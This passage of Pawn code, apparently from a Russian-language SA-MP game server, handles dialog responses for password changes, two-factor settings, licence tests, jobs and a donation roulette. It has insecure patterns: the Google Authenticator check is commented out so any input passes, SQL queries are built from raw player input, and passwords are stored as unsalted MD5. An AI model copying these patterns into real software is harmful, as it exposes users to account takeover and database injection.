			mysql_format(dbHandle, STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ACCOUNTS" SET `member` = 0, `rank` = 0, `leader` = 0 WHERE `leader` = '%i'",strval(inputtext));
			mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
			SendClientMessage(playerid,-1,"Фракция расформирована");
		}
	case D_JOB+201:
	    {
	        if(!response) return 1;
	        switch(listitem)
	        {
	            case 0: ShowPlayerDialog(playerid, D_JOB+18, 1, "Смена пароля", "{FFFFFF}Введите Ваш действующий пароль:", "Принять", "Отмена");
				case 1:
				{
    				new dialog[120];
				    format(dialog, sizeof(dialog),
						"Установить Google Authenticator\n\
						Удалить Google Authenticator\n\
						Спрашивать Google Authenticator %s",
					(PI[playerid][pAuthenticator] == 0) ? ("{32CD32}[При смене IP]") : ("{0089ff}[Всегда]"));
					ShowPlayerDialog(playerid, 6170, DIALOG_STYLE_LIST, !"{ff9300}Управление Google Authenticator", dialog, !"Выбрать", !"Закрыть");
				}
	            case 2:
	            {
	                if(PI[playerid][pCheckCode])
					{
					    PI[playerid][pCheckCode] = 0;
					    MysqlUpdatePlayerInt(playerid,"checkcode",PI[playerid][pCheckCode]);
						PlayerSecurity(playerid);
					}
					else ShowPlayerDialog(playerid, 12422, DIALOG_STYLE_INPUT, "Графический пароль", "{FFFFFF}Графический пароль защищает Ваш аккаунт, если Ваш IP адрес не совпадает с последним IP адресом.\nУбедитесь в правильности ввода данных и сделайте скриншот (F8).\nГрафический пароль может состоять только из 4 цифр!", "Принять", "Назад");
	            }
	            case 3:
	            {
	                if(PI[playerid][pCheckCode])
	                {
	                    new mes[30];
	                    switch(PI[playerid][pCheckCode])
	                    {
	                        case 1: mes = "Запрашивается всегда";
	                        case 2: mes = "При несовпадении IP адреса";
	                        case 3: mes = "При несовпадении подсети";
	                    }
	                    STRING_GLOBAL[0] = EOS;
	                    format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "{FFCD00}- %s{FFFFFF}\n1. Запрашивать всегда\n2. При несовпадении IP адреса\n3. При несовпадении подсети", mes);
	                	ShowPlayerDialog(playerid, 12423, DIALOG_STYLE_LIST, "Настройки графического пароля", STRING_GLOBAL, "Выбрать", "Назад");
                	}
                	else SendClientMessage(playerid, COLOR_GREY, "У Вас не установлен графический пароль!");
	            }
	        }
	    }
    case 6170:
		{
		    if(!response) return 1;
		    {
		    	PI[playerid][pAuthenticator] = !PI[playerid][pAuthenticator];
			    if(PI[playerid][pAuthenticator] == 0) SendClientMessage(playerid, C_OSNOV, "[Уведомление] {FFFFFF}Ваш Google Authenticator код теперь будет запрашиваться при каждом входе");
				else if(PI[playerid][pAuthenticator] == 1) SendClientMessage(playerid, C_OSNOV, "[Уведомление] {FFFFFF}Ваш Google Authenticator теперь будет запрашиваться при каждой смене IP");
				static const fmt_query[] = "UPDATE `users` SET `gs` = '%d' WHERE `id` = '%d'";
				new query[sizeof(fmt_query)+(-2+1)+(-2+8)];
				format(query, sizeof(query), fmt_query, PI[playerid][pAuthenticator], PI[playerid][pID]);
				mysql_tquery(dbHandle, query);
				new dialog[120];
    			format(dialog, sizeof(dialog),
					"Установить Google Authenticator\n\
					Удалить Google Authenticator\n\
					Спрашивать Google Authenticator %s",
				(PI[playerid][pAuthenticator] == 0) ? ("{32CD32}[При смене IP]") : ("{0089ff}[Всегда]"));
				ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_LIST, !"{ff9300}Управление Google Authenticator", dialog, !"Выбрать", !"Закрыть");
		    }
		}
 	case 6169:
		{
		    if(!strlen(inputtext)) return Kick(playerid); // ничего не ввел
		    //new getcode = GoogleAuthenticatorCode(PI[playerid][GOOGLEAUTH], gettime());
			/*PI[playerid][GOOGLEAUTH] = EOS;
			for(new i; i < 16; i++)
			{
   				PI[playerid][GOOGLEAUTH][i] = random(25) + 65;
			}*/
		    //if(strval(inputtext) != getcode) return Ban(playerid); // ввел неверно код, баним IPшник
		    SendClientMessage(playerid, -1, "Код введен верно, вход на сервер разрешен!"); // если все норм
		    SpawnPlayer(playerid); // спавним игрока или что вам там надо делаем тут
		}
	case 12422:
		{
			if(!response) return PlayerSecurity(playerid);
			new day;
			if(sscanf(inputtext, "i", day)) return ShowPlayerDialog(playerid, 12422, DIALOG_STYLE_INPUT, "Графический пароль", "{FFFFFF}Графический пароль защищает Ваш аккаунт, если Ваш IP адрес не совпадает с последним IP адресом.\nУбедитесь в правильности ввода данных и сделайте скриншот (F8).\nГрафический пароль может состоять только из 4 цифр!", "Принять", "Назад");
			if(strlen(inputtext) != 4) return ShowPlayerDialog(playerid, 12422, DIALOG_STYLE_INPUT, "Графический пароль", "{FFFFFF}Графический пароль защищает Ваш аккаунт, если Ваш IP адрес не совпадает с последним IP адресом.\nУбедитесь в правильности ввода данных и сделайте скриншот (F8).\nГрафический пароль может состоять только из 4 цифр!", "Принять", "Назад");
			if(strfind(inputtext, "0", true) != -1)
			{
			    ShowPlayerDialog(playerid, 12422, DIALOG_STYLE_INPUT, "Графический пароль", "{FFFFFF}Графический пароль защищает Ваш аккаунт, если Ваш IP адрес не совпадает с последним IP адресом.\nУбедитесь в правильности ввода данных и сделайте скриншот (F8).\nГрафический пароль может состоять только из 4 цифр!", "Принять", "Назад");
				return SendClientMessage(playerid, COLOR_GREY, "В графическом пароле нельзя использовать цифру 0");
			}
			PI[playerid][pSecurityCode] = day;
			PI[playerid][pCheckCode] = 2;
			SendMes(playerid, COLOR_LIME, "Ваш новый графический пароль: {ffffff}%i", day);
			SendClientMessage(playerid, COLOR_LIME, "Рекомендуется сделать скриншот. Клавиша: {ffffff}F8");
			MysqlUpdatePlayerInt(playerid,"securitycode",PI[playerid][pSecurityCode]);
			MysqlUpdatePlayerInt(playerid,"checkcode",PI[playerid][pCheckCode]);
		}
	case 12423:
	    {
	        if(!response) return PlayerSecurity(playerid);
			switch(listitem)
			{
				case 1:
				{
					PI[playerid][pCheckCode] = 1;
					SendClientMessage(playerid, COLOR_GREEN, "Графический пароль будет запрашиваться при каждом заходе на сервер");
				}
				case 2:
				{
				    PI[playerid][pCheckCode] = 2;
				    SendClientMessage(playerid, COLOR_GREEN, "Графический пароль будет запрашиваться при несовпадении IP адреса");
				}
				case 3:
				{
				    PI[playerid][pCheckCode] = 3;
				    SendClientMessage(playerid, COLOR_GREEN, "Графический пароль будет запрашиваться при несовпадении подсети");
				}
			}
			MysqlUpdatePlayerInt(playerid,"checkcode",PI[playerid][pCheckCode]);
	    }
    case D_ASHTEST:
		{
			if(!response) return 1;
			ShowTestQuestion(playerid,0,5,D_ASHTEST+1);
		}
	case D_ASHTEST+1:
		{
			if(!response) return 1;
			new q = pTemp[playerid][pTestQNumber];
			if(!listitem) return ShowTestQuestion(playerid,0,2,D_ASHTEST+1,q);
			if(listitem != gExamTrueAnswer[q]) return SendClientMessage(playerid,COLOR_GREY,"К сожалению Вы ответили неверно. Тест провален");
			ShowTestQuestion(playerid,5,10,D_ASHTEST+2);
		}
	case D_ASHTEST+2:
		{
			if(!response) return 1;
			new q = pTemp[playerid][pTestQNumber];
			if(!listitem) return ShowTestQuestion(playerid,2,4,D_ASHTEST+2,q);
			if(listitem != gExamTrueAnswer[q]) return SendClientMessage(playerid,COLOR_GREY,"К сожалению Вы ответили неверно. Тест провален");
			ShowTestQuestion(playerid,10,15,D_ASHTEST+3);
		}
	case D_ASHTEST+3:
		{
			if(!response) return 1;
			new q = pTemp[playerid][pTestQNumber];
			if(!listitem) return ShowTestQuestion(playerid,4,6,D_ASHTEST+3,q);
			if(listitem != gExamTrueAnswer[q]) return SendClientMessage(playerid,COLOR_GREY,"К сожалению Вы ответили неверно. Тест провален");
			ShowTestQuestion(playerid,15,20,D_ASHTEST+4);
		}
	case D_ASHTEST+4:
		{
			if(!response) return 1;
			new q = pTemp[playerid][pTestQNumber];
			if(!listitem) return ShowTestQuestion(playerid,6,8,D_ASHTEST+4,q);
			if(listitem != gExamTrueAnswer[q]) return SendClientMessage(playerid,COLOR_GREY,"К сожалению Вы ответили неверно. Тест провален");
			ShowTestQuestion(playerid,20,25,D_JOB+43);
		}
	case D_JOB+18:
		{
			if(!response) return 1;
			/*new password[32];
			if(sscanf(inputtext, "s[90]",password)) return ShowPlayerDialog(playerid, D_JOB+18, 1, "Смена пароля", "{ffffff}Введите Ваш действующий пароль:", "Принять", "Отмена");
			if(strlen(password) < 6 || strlen(password) > 16)
			{
				SendClientMessage(playerid, COLOR_GREY, "Количество символов от 6 до 16!");
				return ShowPlayerDialog(playerid, D_JOB+18, 1, "Смена пароля", "{ffffff}Введите Ваш действующий пароль:", "Принять", "Отмена");
			}
			if(IsTextRussian(password))
			{
				SendClientMessage(playerid, COLOR_GREY, "Использовать русские символы запрещено!");
				return ShowPlayerDialog(playerid, D_JOB+18, 1, "Смена пароля", "{ffffff}Введите Ваш действующий пароль:", "Принять", "Отмена");
			}
			if(!strcmp(password, PI[playerid][pPassword], true)) ShowPlayerDialog(playerid, D_JOB+19, 1, "Смена пароля", "{ffffff}Введите новый пароль:", "Принять", "Отмена");
			else
			{
				SendMess(playerid, MSG_PLAYER_NEED_TO_LOGGED);
				Kick(playerid);
			}*/

			new len = strlen(inputtext);

			if(1 <= len <= 15)
			{
				if(strlen(inputtext) && !strcmp(PI[playerid][pPassword], inputtext, false, 16))
				{
					ShowPlayerDialog(playerid, D_JOB+19, 1, "Смена пароля", "{ffffff}Введите новый пароль:", "Принять", "Отмена");

					return 1;
				}
				else SendClientMessage(playerid, 0xFF6600FF, "Вы ввели неверный пароль");
			}
			else SendClientMessage(playerid, COLOR_GREY, "Количество символов от 1 до 15!");
		}
	case D_JOB+19:
		{
			if(!response) return 1;

			/*new password[32];
			if(sscanf(inputtext, "s[90]",password)) return ShowPlayerDialog(playerid, D_JOB+19, 1, "Смена пароля", "{ffffff}Введите новый пароль:", "Принять", "Отмена");
			if(strlen(password) < 3 || strlen(password) > 16)
			{
				SendClientMessage(playerid, COLOR_GREY, "Количество символов от 3 до 16!");
				return ShowPlayerDialog(playerid, D_JOB+19, 1, "Смена пароля", "{ffffff}Введите новый пароль:", "Принять", "Отмена");
			}
			if(IsTextRussian(password))
			{
				SendClientMessage(playerid, COLOR_GREY, "Использовать русские символы запрещено!");
				return ShowPlayerDialog(playerid, D_JOB+19, 1, "Смена пароля", "{ffffff}Введите новый пароль:", "Принять", "Отмена");
			}
			strmid(PI[playerid][pPassword], password, 0, strlen(password), 32);
			SendMes(playerid, COLOR_LIGHTRED, "Ваш новый пароль: {ffffff}'%s' (без кавычек)", inputtext);
			SendClientMessage(playerid, COLOR_LIGHTRED, "Рекомендуется сделать скриншот. Клавиша: {ffffff}F8");

			new string[128];
			format(string, sizeof(string), "UPDATE "T_ACCOUNTS" SET `password` = MD5('%s') WHERE `name` = '%s'", password, GetName(playerid));
			mysql_tquery(dbHandle, string, "", "");*/

			if(!(1 <= strlen(inputtext) <= 15) || strfind(inputtext, " ") != -1)
			{
				SendClientMessage(playerid, 0xFF6600FF, "Длина пароля должна быть от 6 до 15 символов");
				SendClientMessage(playerid, 0xFF6600FF, "Также не допускается использование пробелов");
			}
			else
			{
				new fmt_msg[90+MAX_PLAYER_NAME];

				strmid(PI[playerid][pPassword], inputtext, 0, strlen(inputtext), 32);

				format(fmt_msg, sizeof fmt_msg, "Ваш новый пароль: {ffffff}'%s' (без кавычек)", inputtext);
				SendClientMessage(playerid, COLOR_LIGHTRED, fmt_msg);

				format(fmt_msg, sizeof fmt_msg, "UPDATE "T_ACCOUNTS" SET `password` = MD5('%s') WHERE `name` = '%s'", inputtext, GetName(playerid));
				mysql_tquery(dbHandle, fmt_msg, "", "");

				SendClientMessage(playerid, COLOR_LIGHTRED, "Рекомендуется сделать скриншот. Клавиша: {ffffff}F8");
			}

		}
		case D_JOB+20:
		{
			if(!response) return 1;

			new len = strlen(inputtext);

			if(3 <= len <= 20)
			{
				new bool: valid_name = true;
				for(new idx; idx < len; idx ++)
				{
					switch(inputtext[idx])
					{
						case 'a'..'z', 'A'..'Z', '[', ']', '_': continue;
						default:
							valid_name = false;
					}
				}

				if(valid_name == false)
					return ShowPlayerDialog(playerid, D_JOB+20, 1, "Смена нонРП ника", "{FFFFFF}Введите будущий ник\n\n{F04245}Возможно сменить только если у Вас нонРП ник!", "Принять", "Назад");

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT * FROM "T_ACCOUNTS" WHERE name = '%s'", inputtext);
				mysql_tquery(dbHandle, STRING_GLOBAL, "OnPlayerChangeName", "is", playerid, inputtext);
			}
		}
		/*case D_JOB+23:
		{
		    if(!response) return RemovePlayerFromVehicle(playerid);
	        new arid = GetArendCarID(GetPlayerVehicleID(playerid));
	        if(arid != -1)
	        {
	        	if(GetPVarInt(playerid, "arendkey") == -1)
				{
		            if(ArendInfo[arid][aPlayerID] == INVALID_PLAYER_ID || !IsPlayerConnected(ArendInfo[arid][aPlayerID]))
		            {
				        if(GetMoney(playerid) >= ArendInfo[arid][aCost])
				        {
				            SetPVarInt(playerid, "arendkey", arid);
							GiveMoney(playerid,-ArendInfo[arid][aCost]);
				            ArendInfo[arid][aPlayerID] = playerid;
				            SendClientMessage(playerid, COLOR_FADE1, "Вы успешно арендовали этот транспорт");
				            ShowPlayerDialog(playerid, 0, 0, "Вы успешно арендовали транспорт", "{FFFFFF}Список доступных команд:\n\n{46ca00}/lock 3{FFFFFF} - закрыть/открыть арендованный транспорт\n{46ca00}/crent{FFFFFF} - отказаться от аренды\n\n{afafaf}При отдалении от ТС на 2км контракт автоматически расторгается", "Закрыть", "");
				        }
						else
						{
						    SendClientMessage(playerid, COLOR_FADE1, "У Вас не хватает денег");
						    RemovePlayerFromVehicle(playerid);
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_FADE1, "Этот транспорт уже арендуют");
					    RemovePlayerFromVehicle(playerid);
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_FADE1, "Вы уже арендуете транспорт");
					RemovePlayerFromVehicle(playerid);
				}
			}
		    return 1;
		}*/
	case D_JOB+30:
		{
			if(!response) SendMess(playerid, MSG_PLAYER_NEED_TO_LOGGED), Kick(playerid);

			if(strlen(inputtext) < 1 || strlen(inputtext) > 36)
				return ShowDialogMailPlayer(playerid);

			for(new i = strlen(inputtext); i != 0; --i)
			{
				switch(inputtext[i])
				{
					case 'А'..'Я', 'а'..'я', ' ': return SKick(playerid, 243);
				}
			}

			strmid(PI[playerid][pMail], inputtext, 0, strlen(inputtext), 64);

            //ShowPlayerDialogGoogle(playerid);

			ShowDialogReferalPlayer(playerid);
		}
	case D_JOB+31:
		{
			if(!response) return 1;
			ClothesRound[playerid] = 2;
			InShopSkin[playerid] = GetPlayerVirtualWorld(playerid);
			SpawnPlayer(playerid);
		}
	case D_JOB+33:
		{
			if(!response)
			{
				ShowDialogSexPlayer(playerid);
				return 1;
			}

			if(strlen(inputtext) < 1 || strlen(inputtext) > MAX_PLAYER_NAME)
				return ShowDialogReferalPlayer(playerid);

			if(IsTextRussian(inputtext) || IsLoginInvalid(inputtext))
			{
				return ShowDialogReferalPlayer(playerid);
			}
			SetPVarString(playerid, "Drug", inputtext);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT * FROM "T_ACCOUNTS" WHERE name = '%s' LIMIT 1", inputtext);
			mysql_tquery(dbHandle, STRING_GLOBAL, "OnPlayerReferal", "i", playerid);
		}
	case D_JOB+38:
		{
			if(!response) return 1;
			new Float:x, Float:y, Float:z;
			x = 617.6924, y = -19.0343, z = 3002.8833;
			if(PI[playerid][SalonCarID] != INVALID_VEHICLE_ID) DestroyVehicle(PI[playerid][SalonCarID]);
			PI[playerid][SalonCarID] = INVALID_VEHICLE_ID;
			DeletePVar(playerid, "InShop");
			TogglePlayerControllable(playerid,true);
			for(new i; i < 2; i++) PlayerTextDrawHide(playerid, JRP_TD[playerid][i]);
			CancelSelectTextDraw(playerid);
			for(new i; i < 19; i++) TextDrawHideForPlayer(playerid, JRPTD[i]);
			SetPlayerPos(playerid,x,y,z);
			SetPlayerInterior(playerid,0);
			SetPlayerVirtualWorld(playerid,0);
			SetCameraBehindPlayer(playerid);
			SendClientMessage(playerid, COLOR_RED, "Вы отменили покупку транспорта");
		}
	case D_JOB+42:
		{
			if(!response) return 1;
			switch(listitem)
			{
			    case 0:
				{
				    if(GetMoney(playerid) < 600) return SendMess(playerid, MSG_NOT_MONEY);
				    if(g_player_skills[playerid][S_LICS][0] == 1) return SendClientMessage(playerid, COLOR_GREY, "У Вас уже имеются водительские права!");
					ShowPlayerDialog(playerid, D_ASHTEST, 0, " ", "Сейчас Вам будет предложено пройти тест.\nЧтобы получить доступ к практическому экзамену\nВам нужно правильно ответить на все 5 вопросов", "Далее", "Назад");
				}
			    case 1:
				{
				    if(GetMoney(playerid) < 6000) return SendMess(playerid, MSG_NOT_MONEY);
				    if(g_player_skills[playerid][S_LICS][2] == 1) return SendClientMessage(playerid, COLOR_GREY, "У Вас уже имеются воздушные права!");

					GiveMoney(playerid, -6000);

					g_player_skills[playerid][S_LICS][2] = 1;
					SavePlayerSkills(playerid);

					SendClientMessage(playerid, C_BLUE, "Вы успешно приобрели воздушные права");
				}
			    case 2:
				{
				    if(GetMoney(playerid) < 4000) return SendMess(playerid, MSG_NOT_MONEY);
				    if(g_player_skills[playerid][S_LICS][1] == 1) return SendClientMessage(playerid, COLOR_GREY, "У Вас уже имеются водные права!");

					GiveMoney(playerid, -4000);

					g_player_skills[playerid][S_LICS][1] = 1;
					SavePlayerSkills(playerid);

					SendClientMessage(playerid, C_BLUE, "Вы успешно приобрели водные права");
				}
			}
			return 1;
		}
	case D_JOB+43:
	    {
	        if(!response) return 1;
			if(GetMoney(playerid) < 600) return SendMess(playerid, MSG_NOT_MONEY);
			SendClientMessage(playerid, 0xffd83dFF, "Поздравляем, Вы сдали тест");
			SendClientMessage(playerid, 0xffd83dFF, "выходите во двор и садитесь в свободный транспорт");
			SetPVarInt(playerid, "DrivingTest", 1);
			pPressed[playerid] = 0;
			return 1;
	    }
	case D_JOB+44:
	    {
	        if(!response) return 1;
			if(GetMoney(playerid) < 6000) return SendMess(playerid, MSG_NOT_MONEY);
			SendClientMessage(playerid, COLOR_BLUE, "Вы начали прохождение экзамена на управление воздушным транспортом");
			SendClientMessage(playerid, COLOR_BLUE, "Выходите во двор и садитесь в вертолёт");
			SetPVarInt(playerid, "FlyTest", 1);
			GiveMoney(playerid, -6000);
			pPressed[playerid] = 0;
			UseGPS[playerid] = true;
			for(new i; i < 3; i++) TextDrawShowForPlayer(playerid, gps_td);
    		DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,1,653.3482,452.5595,12.0000,0.0,0.0,0.0,5.0);
			return 1;
	    }
	case D_JOB+45:
	    {
	        if(!response) return 1;
			if(GetMoney(playerid) < 4000) return SendMess(playerid, MSG_NOT_MONEY);
			SendClientMessage(playerid, COLOR_BLUE, "Вы начали прохождение экзамена на управление водным транспортом");
			SendClientMessage(playerid, COLOR_BLUE, "Выходите во двор и отправляйтесь на озеро!");
			SetPVarInt(playerid, "WaterTest", 1);
			GiveMoney(playerid, -4000);
			pPressed[playerid] = 0;
			UseGPS[playerid] = true;
			for(new i; i < 3; i++) TextDrawShowForPlayer(playerid, gps_td);
    		DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,1,-274.1142,1148.0499,11.8394,0.0,0.0,0.0,5.0);
			return 1;
	    }
    case D_JOB+53:
		{
			if(!response) return 1;
			if(!GetPVarInt(playerid, "O_COLOR")) return SendClientMessage(playerid, -1, "Сначала выберите основной цвет");
			new color;
			if(sscanf(inputtext, "i",color)) return ShowPlayerDialog(playerid, D_JOB+53, 1, "Цвет салона", "{FFFFFF}Введите цвет салона транспорта:", "Принять", "Отмена");
			if(color < 0 || color > 252)
			{
				ShowPlayerDialog(playerid, D_JOB+53, 1, "Цвет салона", "{FFFFFF}Введите цвет салона транспорта:", "Принять", "Отмена");
				return SendClientMessage(playerid, COLOR_GREY, "ID цвета от 0 до 252!");
			}
			colors[playerid][1] = color;
			ChangeVehicleColor(GetPlayerVehicleID(playerid), colors[playerid][0], colors[playerid][1]);
			DeletePVar(playerid, "O_COLOR");
			return 1;
		}
	case D_JOB+54:
		{
			if(!response) return 1;
			new color;
			if(sscanf(inputtext, "i",color)) return ShowPlayerDialog(playerid, D_JOB+54, 1, "Основной цвет", "{FFFFFF}Введите основной цвет транспорта:", "Принять", "Отмена");
			if(color < 0 || color > 252)
			{
				ShowPlayerDialog(playerid, D_JOB+54, 1, "Основной цвет", "{FFFFFF}Введите основной цвет транспорта:", "Принять", "Отмена");
				return SendClientMessage(playerid, COLOR_GREY, "ID цвета от 0 до 252!");
			}
			//ChangeVehicleColor(GetPlayerVehicleID(playerid), color, 1);
			colors[playerid][0] = color;
			SetPVarInt(playerid, "O_COLOR", 1);
			return 1;
		}
		case D_JOB+55:
		{
			if(!response) return 1;
			new price;
			if(sscanf(inputtext, "i", price)) return ShowPlayerDialog(playerid, D_JOB+55, 1, "Проезд", "{ffffff}Введите стоимость проезда:", "Принять", "Отмена");
			if(price < 5 || price > 100)
			{
				SendClientMessage(playerid, COLOR_GREY, "Цена проезда от 5 до 100!");
				return ShowPlayerDialog(playerid, D_JOB+55, 1, "Проезд", "{ffffff}Введите стоимость проезда:", "Принять", "Отмена");
			}
			SetPVarInt(playerid, "PriceBus", price);
			ShowPlayerDialog(playerid, D_JOB+56, 2, "Маршрут", "Арзамас - Батырево", "Принять", "Отмена");
		}
		case D_JOB+56:
		{
			if(!response) return 1;
			new vehicleid = GetPlayerVehicleID(playerid);
			PI[playerid][BusCarID] = vehicleid;
			GiveMoney(playerid, -200, "Проезд в автобусе");
			new name[37];
			switch(listitem)
			{
				case 0: name = "Автовокзал-Лесопилка-Шахта-Автошкола";
			}
			new string[128];
			SetPVarInt(playerid, "TypeBus", listitem+1);
			format(string, 90, "%s\n{FFFFFF}Стоимость проезда: {63BD4E}%iр", name, GetPVarInt(playerid, "PriceBus"));
			if(!IsValidDynamic3DTextLabel(BusText3D[playerid])) BusText3D[playerid] = CreateDynamic3DTextLabel(string, 0xffa500FF, 0.0, 0.0, 1.0, 20.0, INVALID_PLAYER_ID, vehicleid);
			pPressed[playerid] = 0;
			new i = pPressed[playerid], type = GetPVarInt(playerid, "TypeBus");
			switch(type)
			{
				case 1: SetPlayerRaceCheckpoint(playerid,0,BusCityLS[i][0],BusCityLS[i][1],BusCityLS[i][2],BusCityLS[i][3],BusCityLS[i][4],BusCityLS[i][5],5.0);
			}
			return 1;
		}
		case D_JOB+57:
		{
			if(!response) return 1;
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_JOB+57, 1, "Тариф", "{ffffff}Введите стоимость проезда:", "Принять", "Отмена");
			if(price < 1 || price > 100)
			{
				SendClientMessage(playerid, COLOR_GREY, "Цена проезда от 1 до 100");
				return ShowPlayerDialog(playerid, D_JOB+57, 1, "Тариф", "{ffffff}Введите стоимость проезда:", "Принять", "Отмена");
			}
			new string[90];
			SendClientMessage(playerid, COLOR_BLUE, "Вы начали работу таксиста");
			SetPVarInt(playerid, "PriceTaxi", price);
			format(string, 90, "Тариф: {63BD4E}%iр", price);
			if(!IsValidDynamic3DTextLabel(TaxiText3D[playerid])) TaxiText3D[playerid] = CreateDynamic3DTextLabel(string, 0xFFFFFFFF, 0.0, 0.0, 1.24, 40.0, INVALID_PLAYER_ID, GetPlayerVehicleID(playerid));
			return 1;
		}
	case D_JOB+58:
		{
			if(!response) return RemovePlayerFromVehicle(playerid);
			ShowPlayerDialog(playerid, D_JOB+55, 1, "Проезд", "{FFFFFF}Введите стоимость проезда:", "Принять", "Отмена");
			return 1;
		}
	case D_JOB+59:
		{
		    if(!response) return RemovePlayerFromVehicle(playerid);
		    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return 1;
		    new vehicleid = GetPlayerVehicleID(playerid);
			SendClientMessage(playerid, COLOR_GREEN, "Вы арендовали такси");
			PI[playerid][TaxiCarID] = vehicleid;
			GiveMoney(playerid, -5000, "Аренда такси");
			return 1;
		}
	case D_JOB+66:
		{
			if(!response) return RemovePlayerFromVehicle(playerid);
		    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return 1;
		    new vehicleid = GetPlayerVehicleID(playerid);
			SendClientMessage(playerid, COLOR_GREEN, "Вы арендовали транспорт");
			PI[playerid][MechanicCarID] = vehicleid;
			GiveMoney(playerid, -200);
			return 1;
		}
	case D_JOB+67:
		{
			new targetid = GetPVarInt(playerid, "PlayerMech"), price = GetPVarInt(playerid, "MechanicPrice");
			if(response)
			{
				if(GetPlayerState(playerid) == 2)
				{
					if(GetMoney(playerid) < price)
					{
						SendMes(targetid,COLOR_LIGHTBLUE, "У игрока %s недостаточно средств", GetName(playerid));
						DeletePVar(playerid, "PlayerMech");
						DeletePVar(playerid, "MechanicPrice");
						return 1;
					}
					SendMes(playerid,COLOR_LIGHTBLUE, "Автомеханик %s отремонтировал ваше авто за %d", GetName(targetid),price);
					SendMes(targetid,COLOR_LIGHTBLUE, "Вы отремонтировали авто %s за %dр", GetName(playerid),price);
					SetVehicleHealth(GetPlayerVehicleID(playerid),1000);
					RepairVehicle(GetPlayerVehicleID(playerid));
					DeletePVar(playerid, "PlayerMech");
					DeletePVar(playerid, "MechanicPrice");

					GiveMoney(playerid, -price);
					GiveMoney(targetid, price);

					g_player_skills[targetid][S_M_FIX] ++;
					SavePlayerSkills(playerid);
				}
				else SendClientMessage(playerid, COLOR_LIGHTBLUE, "Вы должны находиться в транспорте!");
			}
			else
			{
				SendMes(targetid, COLOR_LIGHTBLUE, "%s отклонил предложение починить транспорт за %iр", GetName(playerid), price);
				DeletePVar(playerid, "PlayerMech");
				DeletePVar(playerid, "MechanicPrice");
			}
		}
 	case 1613:
		{
		    if(!response) return callcmd::donate(playerid);
			switch(listitem)
			{
				case 0:
		    	{
  					if(PI[playerid][pCredits] < 100) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно кредитов!");
					{
					    new rand_donate = random(100) + 20;
					    PI[playerid][pCredits] -= 100;
					    PI[playerid][pCredits] += rand_donate;
						new string[128];
						format(string,sizeof(string), "Вы прокрутили рулетку и выиграли {bbbbbb}%d кредит{ffcd00} на игровой аккаунт", rand_donate);
						SendClientMessage(playerid, 0xFFCD00FF, string);
						MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
					}
				}
				case 1:
			   	{
	  				if(PI[playerid][pCredits] < 150) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно кредитов!");
					{
					    new rand_money = random(110000) + 50000;
					    PI[playerid][pCredits] -= 150;
						GiveMoney(playerid, rand_money);
						new string[128];
						format(string,sizeof(string), "Вы прокрутили рулетку и выиграли {bbbbbb}%dр{ffcd00} на игровой аккаунт", rand_money);
						SendClientMessage(playerid, 0xFFCD00FF, string);
						MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
					}
				}
				case 2:
    			{
				        new string_dialogue[841], string[340];
						format(string, sizeof(string), "{FFFFFF}Донат рулетка - возможно выбить кредиты на свой аккаунт до 1000 кредитов.");
						strcat(string_dialogue, string);
						strcat(string_dialogue, "\n\n");
						format(string, sizeof(string), "{FFFFFF}Денежная рулетка - возможно выбить деньги на свой аккаунт до 500.000 рублей");
						strcat(string_dialogue, string);
						ShowPlayerDialog(playerid, D_JOB+178, 0, "Информация", string_dialogue, "Закрыть", "Назад");
		    	}
			}
		}
    case D_JOB+173:
		{
			if(!response) return 1;
			switch(listitem)
			{
			    case 0:
				{
				    if(Settings[playerid][0] == 0) Settings[playerid][0] = 1;
					else Settings[playerid][0] = 0;
				}
				case 1:
			    {
			        if(Settings[playerid][7] == 0)
					{
					    Settings[playerid][7] = 1;
						foreach(new i: Player) ShowPlayerNameTagForPlayer(playerid, i, 1);
					}
					else
					{
						Settings[playerid][7] = 0;
				  		foreach(new i: Player) ShowPlayerNameTagForPlayer(playerid, i, 0);
					}
     			}
     			case 2:
				{
				    if(Settings[playerid][1] == 0) Settings[playerid][1] = 1;
					else Settings[playerid][1] = 0;
				}
				case 3:
				{
				    if(Settings[playerid][2] == 0) Settings[playerid][2] = 1;
					else Settings[playerid][2] = 0;
				}
				case 4:
				{
					if(Settings[playerid][3] == 1)
			    	{
					    if(GetMoney(playerid) >= 5000000) // кейс появляется только тогда, когда у игрока млн и больше
						{
						    if(!GetPVarInt(playerid, "keis"))
						    {
					        	SetPlayerAttachedObject(playerid,8,1210,5,0.299999,0.099999,0.000000,0.000000,-83.000000,0.000000,1.000000,1.000000,1.000000);
					        	SetPVarInt(playerid, "keis", true);
							}
							if(GetPVarInt(playerid, "keis"))
							{
							    if(GetPlayerWeapon(playerid) > 0 || GetPlayerState(playerid) != PLAYER_STATE_ONFOOT)
							    {
							        if(IsPlayerAttachedObjectSlotUsed(playerid, 8))
					      				RemovePlayerAttachedObject(playerid, 8);
							    }
							    else
							    {
							        if(!IsPlayerAttachedObjectSlotUsed(playerid, 8))
							            SetPlayerAttachedObject(playerid,8,1210,5,0.299999,0.099999,0.000000,0.000000,-83.000000,0.000000,1.000000,1.000000,1.000000);
							    }
							}
						}
						Settings[playerid][3] = 0;
					}
					else
					{
						if(IsPlayerAttachedObjectSlotUsed(playerid, 8))
						{
						    if(GetPVarInt(playerid, "keis"))
						    {
				      			RemovePlayerAttachedObject(playerid, 8);
				      			DeletePVar(playerid, "keis");
							}
						}
						Settings[playerid][3] = 1;
					}
				}
				case 5:
				{
				    if(Settings[playerid][5] == 0) Settings[playerid][5] = 1;
